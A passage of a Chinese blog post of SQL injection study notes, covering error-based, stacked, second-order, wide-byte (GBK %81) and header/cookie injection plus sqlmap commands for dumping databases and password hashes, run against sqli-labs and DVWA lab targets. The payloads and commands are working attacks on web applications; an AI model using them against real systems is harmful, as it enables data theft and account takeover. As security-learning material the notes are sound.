+<p>?id=1’ and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security ‘ limit 0,1),0x7e),1))—+</p>
+<p>通过两个函数查询时需注意：查询数据长度限制在32位之内，如果超过32位</p>
+<p>可以使用left() right() substr() 通过截取长度分段显示出来</p>
+<h2 id="26-堆叠注入"><a href="#26-堆叠注入" class="headerlink" title="26 堆叠注入"></a>26 堆叠注入</h2><p>利用;隔开</p>
+<p>和union注入的区别</p>
+<p>and 1=1—+成立 and 1=2— +不成立来判断是否可以注入</p>
+<p>order by 判断字段数 ==？==</p>
+<p>?id=-888’ union select 1,2,3==?把888注释掉==</p>
+<p>?=id=-888‘ union select 1,2,3;select sleep(5)—+</p>
+<p>?=id=-888‘ union select ‘~‘,database(),’~’—+</p>
+<p>?=id=-888‘ union select ‘~‘,table_name,’~’ from information_schema.tables where table_schema=’test’—+</p>
+<p>?=id=-888‘ union select ‘~‘,column_name,’~’ from information_schema.columns where table_schema=’test’ and table_name=’floor_test’—+</p>
+<p>更改数据</p>
+<p>?id=-888’;update floortest set name=’change’ where id=6 —+</p>
+<p>还可以进行delect/插入操作</p>
+<p>原理：php使用PDO编译，存在堆叠注入，可以执行多条sql语句</p>
+<p>union注入只能进行查询操作</p>
+<h2 id="27-二次注入"><a href="#27-二次注入" class="headerlink" title="27 二次注入"></a>27 二次注入</h2><p>攻击者在注册的地方构造恶意的sql语句，提交到服务器储存到数据库中</p>
+<p>注册 username:admin’# password:123456</p>
+<p>修改admin’#的密码</p>
+<p>查看数据库发现admin’#密码未被改变 而admin密码改变</p>
+<p>原理：</p>
+<p>修改密码源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'"</span>;</span><br></pre></td></tr></table></figure>
+<p>实际修改了admin的密码 并且’ and password=’$curr_pass’被注释了</p>
+<p>这样就可以实现随意指定用户名而不用知道他的密码 修改其密码</p>
+<h2 id="28-宽字节注入"><a href="#28-宽字节注入" class="headerlink" title="28 宽字节注入"></a>28 宽字节注入</h2><p>一.什么是宽字节注入</p>
+<p>宽字节注入是因为gbk编码方式需要两个ascii码组合来解码，所以形象的叫做宽字节</p>
+<p>二.宽字节注入的条件</p>
+<p>1)数据库查询设置为GBK编码</p>
+<p>2)addslashes(),mysql_real_escape_string(),mysql_escape_string()这类的过滤函数(会对输入的字符串产生过滤操作)</p>
+<p>两条同时满足</p>
+<p>三、原理</p>
+<p>假设我们传递一个参数id=1’ 会被认为单引号是不合法的，会被过滤函数添加转义”\”给过滤掉。要想程序接受我们传递的参数中包含单引号，就需要把转义字符给干掉</p>
+<p>当http协议传输时，要经过url编码的（空格变为%20，单引号变为 %27），如果这个编码完成后，传递到服务器，==有奇数个数==（有奇数个url编码），它会把前边偶数个数的字符当gbk编码去解码，那么剩下的就当普通的url去解码，所以我们就可以在单引号之前添加一个%81这样的编码，这样到最后解码的时候，这个%81就会和”\”对应的编码相结合按照gvk的要求去解码，最后就只剩下个单引号。</p>
+<p>四、实例</p>
+<p>%5c表示反斜杠</p>
+<p>?id=1’</p>
+<p>提交过后 1%5c%27</p>
+<p>?id=1%81’</p>
+<p>提交过后 1%81%5c%27</p>
+<p>由于gbk编码特性,%81%5c组合，%27解码成单引号</p>
+<p>发生报错，说明成功干扰，%81%5c解码成中文</p>
+<p>按照正常流程进行注入</p>
+<p>进行union,order by下一步操作</p>
+<p>?id=1%81’ union select 1,2,3—+</p>
+<p>页面不显示，如果想将联合查询的内容显示到页面上</p>
+<p>?id=-1%81’ union select 1,2,3—++</p>
+<p>前面的-1查询不到，就会把后面的内容显示到页面上</p>
+<p>在2,3位置查询user() database()</p>
+<p>进行后续系列操作</p>
+<p>注意：table_schema=’security’又被转义，这时不能通过宽字节注入，因为对应的数据库名前对加上汉字，可以转换字符串为对应的十六进制0x+就可以解决问题</p>
+<p>五、其他</p>
+<p>若想将网页修改为gbk编码方式：更多-&gt;文字编码-&gt;简体中文</p>
+<p>gbk编码是由两个ascii字符来解码的，gbk编码汉字是从%81开始的</p>
+<p>从81开始都可以到FE结束，都可以达到编码效果</p>
+<h2 id="29-UserAgent、Referer、Cookie注入"><a href="#29-UserAgent、Referer、Cookie注入" class="headerlink" title="29 UserAgent、Referer、Cookie注入"></a>29 UserAgent、Referer、Cookie注入</h2><p>注入点不仅存在与get/post传参，请求包头部字段user-agent/referer/cookie/x-forwarded-for(头部字段名)都有可能发生sql注入</p>
+<h3 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h3><p>使用burp抓包分析请求报文</p>
+<p>将抓到的post请求包发送到repeater模块</p>
+<p>通过更改User-agent的值查看页面回显</p>
+<p>user-agent:aaa’ 使用闭合单引号发现出现报错，干扰了正常的sql语句</p>
+<p>构造报错注入相关语句</p>
+<p>使用—+和#都报错说明注释可能无法使用，改为</p>
+<p>user-agent:aaaa’ and ‘1’=’1</p>
+<p>使用常见的三种报错函数进行报错注入</p>
+<p>user-agent: aaa’ and extractvalue(1,concat(0x7e,(select user()),0x7e)) and ‘1’=’1</p>
+<p>后续进行sql注入</p>
+<p><strong>select @@basedir为安装路径查询</strong></p>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>Cookie:uname=admin</p>
+<p>Cookie:uname=admin’ 产生报错</p>
+<p>Cookie:uname=admin’ and ‘1’=’1</p>
+<p>Cookie:uname=admin; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))</p>
+<p>注意：取出数据的长度最多三十二位，如果想要完整显示出来，需要使用字符串截取函数分段显示出来</p>
+<h2 id="30-通过注入漏洞获取账号密码登录后台网站"><a href="#30-通过注入漏洞获取账号密码登录后台网站" class="headerlink" title="30 通过注入漏洞获取账号密码登录后台网站"></a>30 通过注入漏洞获取账号密码登录后台网站</h2><p>?id=1’ 页面发生变化，变为空白</p>
+<p>?id=1’—+ 页面保持空白，说明此处id类型不是字符型</p>
+<p>?id=1 and 1=1 页面正常显示</p>
+<p>这时看?id=1 and 1=2 若也正常显示，说明此处不存在注入点；不正常显示，判断为数字型的sql注入</p>
+<p>?id=-1 union select 1,2,3,4</p>
+<p>查出字段后 将查询值改为查不到的数值可以看到字段在哪里回显</p>
+<h2 id="31-sqlmap简介与使用"><a href="#31-sqlmap简介与使用" class="headerlink" title="31 sqlmap简介与使用"></a>31 sqlmap简介与使用</h2><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，采用四种SQL注入技术：union注入，堆叠注入，报错注入，时间盲注，布尔盲注</p>
+<p>sqlmap基于python2.7</p>
+<h3 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h3><p><strong>判断是否存在注入</strong></p>
+<p>①sqlmap -u <a href="http://193.112.113.137/sqlilbs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilbs/less-1?id=1</a></p>
+<p>弹出it looks like the back-end DBMS is “MySQL”.Do you want to skip test payloads specific for other DBMSes?进行交互</p>
+<p>(数据库可能是MySQL数据库，是否跳过检测其他数据库)</p>
+<p>for the remaining tests,do you want to include all tests for ‘MySQL’ extending provided level(1) and risk(1) values?</p>
+<p>(在level(1) and risk(1)情况下，是否使用Mysql所有的payload进行检测，默认即可)</p>
+<p>②使用burpsuite抓包</p>
+<p>将请求(Request-Raw)复制到kali中</p>
+<p>创建文本文件vim sqlcheck.txt</p>
+<p>sqlmap -r sqlcheck.txt</p>
+<p>效果和①相同</p>
+<p>当payload只有Id一个参数时不用加双引号，当有两个参数时，sqlmap -u “<a href="http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1</a>“ 使用＆并添加双引号</p>
+<p><strong>查询当前用户下所有数据库</strong></p>
+<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> —dbs</p>
+<p><strong>获取某个数据库中的表名</strong></p>
+<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获取哪一个数据库中的表名) security —tables(获取security数据库中所有表名)</p>
+<p><strong>获取某张表中的字段名</strong></p>
+<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获数据库来定位)security -T users —columns</p>
+<p><strong>获取字段里的数据</strong></p>
+<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获数据库来定位)security -T users -C id,username,password</p>
+<p>—dump</p>
+<p>需要获取的字段通过逗号连接 id,username,password</p>
+<h2 id="32-sqlmap自动化注入实战"><a href="#32-sqlmap自动化注入实战" class="headerlink" title="32 sqlmap自动化注入实战"></a>32 sqlmap自动化注入实战</h2><p>首先判断注入点是否存在</p>
+<p>sqlmap -u url</p>
+<p>如果不确定注入点是否在get方式，可以把http请求保存到文本，sqlmap -r 在文本中读取http请求进行测试</p>
+<p>读取当前所有数据库 —dbs</p>
+<p>查看当前的数据库 sqlmap -u url —current -db</p>
+<p>获取数据库中所有表</p>
+<p>sqlmap -u url -D nonoi_col(数据库名) —tables</p>
+<p>获取表里的字段</p>
+<p>sqlmap -u url -D nonoi_col(数据库名) -T cat(表名) —columns</p>
+<p>获取数据</p>
+<p>sqlmap -u url -D nonoi_col -T cat -C cat_name,cid —dump</p>
+<p>如果直接使用—dump</p>
+<p>sqlmap -u url —dump</p>
+<p> 自动把所有数据库中所有表给读取出来</p>
+<p>并对相应的哈希值进行暴力破解</p>
+<h2 id="33-sqlmap的使用以及load-file-读取目标系统文件"><a href="#33-sqlmap的使用以及load-file-读取目标系统文件" class="headerlink" title="33 sqlmap的使用以及load_file()读取目标系统文件"></a>33 sqlmap的使用以及load_file()读取目标系统文件</h2><h3 id="sqlmap连接需要登录的页面"><a href="#sqlmap连接需要登录的页面" class="headerlink" title="sqlmap连接需要登录的页面"></a>sqlmap连接需要登录的页面</h3><p>ipconfig查询本地ip</p>
+<p>sqlmap -u “<a href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="noopener">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ —dbs</p>
+<p>会显示sqlmap got a 302 redirect to ‘…’ 进行重定向</p>
+<p>如果换一个浏览器，访问上述地址会首先判断是否登陆过系统</p>
+<p>如果没有登录，就会跳转到登录页面登录</p>
+<p>如果使用sqlmap遇到这种需要登录才能访问的页面，直接点击回车是不会测出任何结果</p>
+<p>我们需要得到对应Cookie，获取cookie的几种方式</p>
+<p>①f12-&gt;console(控制台)-&gt;输入js语句 document.cookie</p>
+<p>会把当前用户的cookie信息打印下来</p>
+<p>②burp抓包获取cookie</p>
+<p>burp获取到的请求报文复制</p>
+<p>vim cookie.txt(新建一个txt) 保存请求报文</p>
+<p>sqlmap -r cookie.txt —dbs</p>
+<p>也可以达到同样的效果</p>
+<p>sqlmap -u “<a href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="noopener">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ —cookie=””  —dbs</p>
+<h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><p>1.查看正在连接的数据库</p>
+<p>sqlmap -r cookie.txt —current-db</p>
+<p>2.获取数据库用户的密码</p>
+<p>sqlmap -r cookie.txt —passwords</p>
+<p>列举出用户和密码哈希值 接着破解密码的哈希值</p>
+<p>3.获取当前数据库的用户名称</p>
+<p>sqlmap -r cookie.txt —current-user</p>
+<p>4.判断当前用户是否为管理权限</p>
+<p>sqlmap -r cookie.txt —is-dba</p>
+<p>如果 DBA:True,说明有管理权限</p>
+<p>5.测试等级 —level</p>
+<p>分为五个等级</p>
+<p>如果平时不加等级，默认的等级为 —level 1</p>
+<p>6.whereis sqlmap查看sqlmap所在目录 </p>
+<p>-&gt; cd  /usr/share/sqlmap </p>
+<p>-&gt; cd xml/</p>
+<p>-&gt; ls</p>
+<p>-&gt;cd payloads</p>
+<p>所有测试的payload都存储在该路径下的xml文件下，如果有自己想加入的测试路径，可以加入进来</p>
+<p>如果使用—level 5是级别最高的，使用的payload最多的，会对自动破解Cookie,xff头部注入进行测试</p>
+<p>运行速度很慢，最好不用使用最高等级</p>
+<p>—level 2时会测试cookie相应注入</p>
+<p>—level 3会测试 useragent </p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+          
+        
+          
+            <p>本文永久链接是：<a href=https://omppppppp.xyz/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/>https://omppppppp.xyz/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+    
+    
+
+<section class="widget qrcode  desktop mobile">
+  
+
+  <div class='content article-entry'>
+    
+      
+        <div class='fancybox'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/wiki_volantis.png'
+        
+          height='64px'
+        ></div>
+      
+    
+      
+        <div class='fancybox'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/wiki_volantis.png'
+        
+          height='64px'
+        ></div>
+      
+    
+  </div>
+</section>
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-19T12:19:36+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Jan 19, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>sql注入</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
+          
+          href="http://connect.qq.com/widget/shareqq/index.html?url=https://omppppppp.xyz/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sql注入学习 - omp's blog&summary=sql注入学习笔记，感谢好朋友月夜见提供的学习资料。包含union注入、布尔盲注、时间盲注、报错注入、堆叠注入、二次注入、宽字节注入、UserAgent/Referer/Cookie注入、sqlmap的使用…"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
+          
+          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://omppppppp.xyz/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sql注入学习 - omp's blog&summary=sql注入学习笔记，感谢好朋友月夜见提供的学习资料。包含union注入、布尔盲注、时间盲注、报错注入、堆叠注入、二次注入、宽字节注入、UserAgent/Referer/Cookie注入、sqlmap的使用…"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
+          
+          href="http://service.weibo.com/share/share.php?url=https://omppppppp.xyz/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sql注入学习 - omp's blog&summary=sql注入学习笔记，感谢好朋友月夜见提供的学习资料。包含union注入、布尔盲注、时间盲注、报错注入、堆叠注入、二次注入、宽字节注入、UserAgent/Referer/Cookie注入、sqlmap的使用…"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2021/01/10/bot/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>基于mirai和graia框架的机器人搭建</p>
+                <p class='content'>一直想搭建一个bot实现一些功能，该bot基于mirai机器人框架和graia搭建，参考sagiri-bot功能实现。自己随便写写，这篇文章主要记录一下报错信息和心路历程。
+
+基本搭建首先找到了...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/11/30/java3/'>
+                <p class='title'>java学习(3)<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>期末考试临时冲的，java的事件处理以及监听类的几个类别。
+
+事件处理监听类监听类的四种选择
+
+选择本类
+定义一个实现了接口XXXListener的新类作为监听类
+定义一个继承于相应适配器类的新...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      
+      
+      
+      
+      
+        <section id="comments">
+          <div id="valine_container" class="valine_thread">
+            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+          </div>
+        </section>
+      
+      
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: 'sql注入学习',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+  <section class="widget toc-wrapper shadow desktop mobile">
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#14-SQL注入原理"><span class="toc-text">14 SQL注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OWASP-top10"><span class="toc-text">OWASP top10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是SQL注入"><span class="toc-text">什么是SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据库基础"><span class="toc-text">数据库基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15、16-mysql注入常见函数"><span class="toc-text">15、16   mysql注入常见函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-18information-schema相关"><span class="toc-text">17 18information_schema相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#information-schema在mysql注入中的运用"><span class="toc-text">information_schema在mysql注入中的运用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-、20-union注入"><span class="toc-text">19 、20 union注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基于union的注入"><span class="toc-text">基于union的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体操作"><span class="toc-text">具体操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-、22-布尔盲注"><span class="toc-text">21 、22 布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手工注入过程"><span class="toc-text">手工注入过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用burpsuite"><span class="toc-text">使用burpsuite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-时间盲注"><span class="toc-text">23  时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#判断id数据类型成功执行sql语句"><span class="toc-text">判断id数据类型成功执行sql语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进行盲注"><span class="toc-text">进行盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-floor报错注入原理"><span class="toc-text">24 floor报错注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理分析"><span class="toc-text">原理分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-floor报错注入利用演示"><span class="toc-text">25 floor报错注入利用演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-extractvalue-和updatexml-报错注入"><span class="toc-text">26 extractvalue()和updatexml()报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错原理"><span class="toc-text">报错原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-堆叠注入"><span class="toc-text">26 堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-二次注入"><span class="toc-text">27 二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-宽字节注入"><span class="toc-text">28 宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-UserAgent、Referer、Cookie注入"><span class="toc-text">29 UserAgent、Referer、Cookie注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-agent注入"><span class="toc-text">user-agent注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie注入"><span class="toc-text">cookie注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-通过注入漏洞获取账号密码登录后台网站"><span class="toc-text">30 通过注入漏洞获取账号密码登录后台网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31-sqlmap简介与使用"><span class="toc-text">31 sqlmap简介与使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap使用"><span class="toc-text">sqlmap使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-sqlmap自动化注入实战"><span class="toc-text">32 sqlmap自动化注入实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-sqlmap的使用以及load-file-读取目标系统文件"><span class="toc-text">33 sqlmap的使用以及load_file()读取目标系统文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap连接需要登录的页面"><span class="toc-text">sqlmap连接需要登录的页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他参数"><span class="toc-text">其他参数</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+  
+    <meting-js
+      theme='#1BCDFC'
+      autoplay='false'
+      volume='0.7'
+      loop='all'
+      order='list'
+      fixed='false'
+      list-max-height='340px'
+      server='netease'
+      type='playlist'
+      id='5004192906'
+      list-folded='true'>
+    </meting-js>
+  
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:me@xaoxuu.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/xaoxuu"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://music.163.com/#/user/home?id=63035382"
+                class="social fas fa-headphones-alt flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+        </div>
+      
+    
+      
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
+      
+    
+      
+        Use
+        <a href="https://volantis.js.org/" target="_blank" class="codename">Volantis</a>
+        as theme, total visits
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          times
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="https://xaoxuu.com" target="_blank" rel="noopener">Copyright © 2017-2020 Mr. X</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '8px',
+        duration: '800',
+        interval: '100',
+        scale: '1'
+      });
+    });
+  </script>
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://gitee.com/wallpapers/minimalist/raw/master/2020/001.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/002.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/003.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/004.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/005.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/006.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/007.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/008.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/009.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/010.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/011.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/012.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/013.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/014.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/015.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/016.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/017.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/018.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/019.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/020.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/021.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/022.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/023.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/024.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/025.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/026.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/027.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/028.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/029.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/030.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/031.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/032.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/033.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/034.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/035.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/036.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/037.jpg", 